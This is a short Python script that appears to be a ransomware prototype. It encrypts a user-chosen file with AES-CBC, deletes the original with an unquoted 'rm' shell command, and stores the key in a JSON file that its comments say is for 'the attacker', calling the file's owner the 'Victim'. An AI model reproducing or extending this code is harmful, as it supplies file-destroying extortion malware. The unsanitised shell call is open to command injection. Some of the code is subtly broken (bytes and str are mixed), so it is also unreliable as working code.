from Crypto.Cipher import AES
import os
import json
from base64 import b64encode

key_length = 32
iv_length = 16

# Makes sure that the length of the message to be encrypted is a multiple of 16 bits
def pad(msg):
	#return msg + (16 - len(msg) % 16) * '='
	return msg + (16 - len(msg) % 16) * chr(16 - len(msg) % 16)

nameOfFile = input('[*] Please Input File To Encrypt ')

extension = nameOfFile[nameOfFile.find('.'):]

key = os.urandom(key_length)
iv = os.urandom(iv_length)

cipher = AES.new(key = key, mode = AES.MODE_CBC, IV = iv)
plaintext = open(nameOfFile, "rb").read()
plaintext = pad(plaintext)
ciphertext = cipher.encrypt(plaintext)

# Victim will keep this file and the original is deleted
file = open("Encrypted_" + nameOfFile, "wb")
file.write(ciphertext)
os.system('rm ' + nameOfFile)

encryption_info = dict()

encryption_info['key'] = b64encode(key)
encryption_info['iv'] = b64encode(iv)
encryption_info['ciphertext'] = b64encode(ciphertext)
encryption_info['extension'] = b64encode(extension)

# Creating a JSON file to store all necessary information for the attacker
# to decrypt the file later
jsonFile = open(nameOfFile[:nameOfFile.find('.')] + ".json", 'w')
json.dump(encryption_info, jsonFile)